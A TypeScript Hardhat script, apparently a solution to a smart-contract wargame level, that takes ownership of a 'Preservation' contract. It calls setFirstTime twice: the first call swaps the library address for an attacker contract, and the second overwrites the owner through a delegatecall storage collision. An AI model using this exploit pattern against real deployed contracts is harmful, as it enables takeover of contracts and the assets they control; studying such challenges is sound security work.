import { deployments, ethers } from "hardhat";
import { BigNumber } from "ethers";
import { Preservation } from "../typechain-types";
import { Deployment } from "hardhat-deploy/types";

// 🕐 Delay function
const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const main = async (): Promise<void> => {
  const [deployer] = await ethers.getSigners();

  const preservationAddress = "0xA5DB1DfEC68DF8d5fBDd46f02755108ecb7249d6";
  const preservation: Preservation = await ethers.getContractAt("Preservation", preservationAddress);
  
  const attackPreservationDeployment: Deployment = await deployments.get("AttackPreservation");
  
  const firstStepParam: BigNumber = ethers.BigNumber.from(attackPreservationDeployment.address);
  const secondStepParam: BigNumber = ethers.BigNumber.from(await deployer.getAddress());

  console.log(`🔍 Initial contract status:`);
  console.log(`📚 Library 1 Address: ${await preservation.timeZone1Library()}`);
  console.log(`📚 Library 2 Address: ${await preservation.timeZone2Library()}`);
  console.log(`👑 Contract Owner: ${await preservation.owner()}`);
  
  console.log(`\n🦹 Starting the attack!`);
  console.log(`🥇 Step 1: Switch library1 to the attack preservation contract...`);
  await preservation.setFirstTime(firstStepParam, {gasLimit: 250000});
  await delay(10000);
  
  console.log(`🥈 Step 2: Overwrite the owner using the deployer address as uint256...`);
  await preservation.setFirstTime(secondStepParam, {gasLimit: 250000});
  await delay(5000);

  console.log(`\n🔍 Post-attack contract status:`);
  console.log(`📚 Library 1 Address: ${await preservation.timeZone1Library()}`);
  console.log(`📚 Library 2 Address: ${await preservation.timeZone2Library()}`);
  console.log(`👑 Contract Owner: ${await preservation.owner()}`);
};

main().catch((error) => {
  console.error("🚫 Error:", error.message);
});
